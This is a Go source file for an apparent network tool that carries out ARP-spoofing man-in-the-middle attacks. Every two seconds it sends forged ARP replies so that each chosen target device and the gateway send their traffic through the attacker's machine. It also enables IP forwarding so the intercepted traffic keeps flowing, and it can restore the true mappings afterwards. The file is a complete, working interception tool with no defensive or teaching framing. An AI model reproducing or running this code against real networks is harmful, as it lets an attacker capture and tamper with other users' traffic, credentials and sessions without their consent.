package mitm

import (
	"log"
	"net"
	"net/netip"
	"os"
	"sync"
	"sync/atomic"
	"time"

	"github.com/mdlayher/arp"
)

type MITM struct {
	iface   *net.Interface
	gwIP    net.IP
	gwMAC   net.HardwareAddr
	ourMAC  net.HardwareAddr

	mu      sync.Mutex
	targets map[string]net.HardwareAddr

	active int32      // atomic bool
	stop   chan struct{}
}

func New(iface *net.Interface, gwIP net.IP) *MITM {
	return &MITM{
		iface:   iface,
		gwIP:    gwIP,
		ourMAC:  iface.HardwareAddr,
		targets: make(map[string]net.HardwareAddr),
	}
}

func (m *MITM) MITMActive() bool { return atomic.LoadInt32(&m.active) == 1 }

func (m *MITM) AddTarget(ip string, mac net.HardwareAddr) {
	m.mu.Lock()
	m.targets[ip] = mac
	m.mu.Unlock()
}

func (m *MITM) StartMITM() error {
	if atomic.SwapInt32(&m.active, 1) == 1 {
		return nil // already running
	}
	mac, _ := m.resolveMAC(m.gwIP)
	if mac != nil {
		m.gwMAC = mac
	}
	log.Printf("MITM start: gw=%s gwMAC=%s targets=%d", m.gwIP, m.gwMAC, len(m.targets))
	enableIPForwarding()
	m.stop = make(chan struct{})
	go m.loop()
	return nil
}

func (m *MITM) StopMITM() {
	if atomic.SwapInt32(&m.active, 0) == 0 {
		return
	}
	close(m.stop)
	m.restore()
	disableIPForwarding()
}

func (m *MITM) loop() {
	tick := time.NewTicker(2 * time.Second)
	defer tick.Stop()
	m.poison() // immediate first shot
	for {
		select {
		case <-m.stop:
			return
		case <-tick.C:
			m.poison()
		}
	}
}

func (m *MITM) poison() {
	cl, err := arp.Dial(m.iface)
	if err != nil {
		return
	}
	defer cl.Close()
	cl.SetDeadline(time.Now().Add(1 * time.Second))

	m.mu.Lock()
	snap := make(map[string]net.HardwareAddr, len(m.targets))
	for k, v := range m.targets {
		snap[k] = v
	}
	m.mu.Unlock()

	gwAddr, _ := netip.AddrFromSlice(m.gwIP.To4())

	for ipStr, tMAC := range snap {
		tIP := net.ParseIP(ipStr).To4()
		if tIP == nil {
			continue
		}
		tAddr, _ := netip.AddrFromSlice(tIP)
		// Tell device: "gateway is at my MAC"
		if p, err := arp.NewPacket(arp.OperationReply, m.ourMAC, gwAddr, tMAC, tAddr); err == nil {
			cl.WriteTo(p, tMAC)
		}
		// Tell gateway: "device is at my MAC"
		if m.gwMAC != nil {
			if p, err := arp.NewPacket(arp.OperationReply, m.ourMAC, tAddr, m.gwMAC, gwAddr); err == nil {
				cl.WriteTo(p, m.gwMAC)
			}
		}
	}
}

func (m *MITM) restore() {
	cl, err := arp.Dial(m.iface)
	if err != nil {
		return
	}
	defer cl.Close()
	cl.SetDeadline(time.Now().Add(2 * time.Second))

	m.mu.Lock()
	snap := make(map[string]net.HardwareAddr, len(m.targets))
	for k, v := range m.targets {
		snap[k] = v
	}
	m.mu.Unlock()

	gwAddr, _ := netip.AddrFromSlice(m.gwIP.To4())
	for ipStr, tMAC := range snap {
		tIP := net.ParseIP(ipStr).To4()
		if tIP == nil {
			continue
		}
		tAddr, _ := netip.AddrFromSlice(tIP)
		if m.gwMAC != nil {
			// Restore: tell device real gateway MAC
			if p, err := arp.NewPacket(arp.OperationReply, m.gwMAC, gwAddr, tMAC, tAddr); err == nil {
				cl.WriteTo(p, tMAC)
			}
			// Restore: tell gateway real device MAC
			if p, err := arp.NewPacket(arp.OperationReply, tMAC, tAddr, m.gwMAC, gwAddr); err == nil {
				cl.WriteTo(p, m.gwMAC)
			}
		}
	}
	log.Println("MITM: ARP restored")
}

func (m *MITM) resolveMAC(ip net.IP) (net.HardwareAddr, error) {
	cl, err := arp.Dial(m.iface)
	if err != nil {
		return nil, err
	}
	defer cl.Close()
	cl.SetDeadline(time.Now().Add(3 * time.Second))
	addr, _ := netip.AddrFromSlice(ip.To4())
	done := make(chan net.HardwareAddr, 1)
	go func() {
		for {
			pkt, _, err := cl.Read()
			if err != nil {
				return
			}
			if pkt.Operation == arp.OperationReply && pkt.SenderIP == addr {
				mac := make(net.HardwareAddr, len(pkt.SenderHardwareAddr))
				copy(mac, pkt.SenderHardwareAddr)
				done <- mac
				return
			}
		}
	}()
	cl.Request(addr)
	select {
	case mac := <-done:
		return mac, nil
	case <-time.After(3 * time.Second):
		return nil, nil
	}
}

func enableIPForwarding()  { os.WriteFile("/proc/sys/net/ipv4/ip_forward", []byte("1\n"), 0644) }
func disableIPForwarding() { os.WriteFile("/proc/sys/net/ipv4/ip_forward", []byte("0\n"), 0644) }
